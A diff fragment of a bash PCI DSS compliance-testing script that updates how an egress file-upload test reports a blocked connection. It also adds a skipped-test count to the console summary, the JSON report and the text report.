-    echo -e "  ${RED}${BOLD}SECURITY IMPACT:${NC} Direct exfiltration of sensitive files possible" 
-    echo -e "  ${YELLOW}${BOLD}REMEDIATION:${NC} Implement deep packet inspection and application controls"
+    echo -e "  ${WHITE}Response: HTTPS request did not complete (curl exit / no HTTP status)${NC}"
+    show_result "File Upload Egress Test" "PASS" "Outbound HTTPS to $EGRESS_TEST_DOMAIN blocked or unreachable" "egress" "1.3.4"
 fi
 
 # Test for ICMP exfiltration
@@ -973,24 +1240,27 @@ fi
 
 # Enhanced Summary with final report generation
 section_header "TEST SUMMARY AND REPORT GENERATION"
-echo -e "${YELLOW}Total Tests:${NC} $(($PASSED + $FAILED))"
+echo -e "${YELLOW}Total Tests:${NC} $(($PASSED + $FAILED + $SKIPPED))"
 echo -e "${GREEN}Tests Passed:${NC} $PASSED"
 echo -e "${RED}Tests Failed:${NC} $FAILED"
+echo -e "${CYAN}Tests Skipped/Info:${NC} $SKIPPED"
 
 # Finalize JSON report
 finalize_json_report() {
     if command -v jq >/dev/null 2>&1; then
         local temp_file=$(mktemp)
-        jq --arg total "$(($PASSED + $FAILED))" \
+        jq --arg total "$(($PASSED + $FAILED + $SKIPPED))" \
            --arg passed "$PASSED" \
            --arg failed "$FAILED" \
+           --arg skipped "$SKIPPED" \
            --arg status "$([ $FAILED -gt 0 ] && echo 'FAILED' || echo 'PASSED')" \
-           '.summary.total_tests = ($total | tonumber) | 
-            .summary.passed = ($passed | tonumber) | 
-            .summary.failed = ($failed | tonumber) | 
+           '.summary.total_tests = ($total | tonumber) |
+            .summary.passed = ($passed | tonumber) |
+            .summary.failed = ($failed | tonumber) |
+            .summary.skipped = ($skipped | tonumber) |
             .summary.compliance_status = $status' \
            "$JSON_REPORT" > "$temp_file" && mv "$temp_file" "$JSON_REPORT"
-        
+
         echo -e "${CYAN}Structured JSON report generated: $JSON_REPORT${NC}"
     fi
 }
@@ -1010,10 +1280,11 @@ Environment: Card Data Environment (CDE)
 OVERALL COMPLIANCE STATUS: $([ $FAILED -gt 0 ] && echo 'NON-COMPLIANT' || echo 'COMPLIANT')
 
 TEST RESULTS SUMMARY:
-- Total Tests Executed: $(($PASSED + $FAILED))
+- Total Tests Executed: $(($PASSED + $FAILED + $SKIPPED))
 - Tests Passed: $PASSED
 - Tests Failed: $FAILED
-- Success Rate: $(( PASSED * 100 / (PASSED + FAILED) ))%
+- Tests Skipped/Info: $SKIPPED
+- Success Rate: $([ $((PASSED + FAILED)) -gt 0 ] && echo "$(( PASSED * 100 / (PASSED + FAILED) ))%" || echo "N/A")
 
 KEY FINDINGS:
 $([ $FAILED -gt 0 ] && echo "- $FAILED critical security controls require immediate attention" || echo "- All tested security controls meet PCI DSS v4.0 requirements")
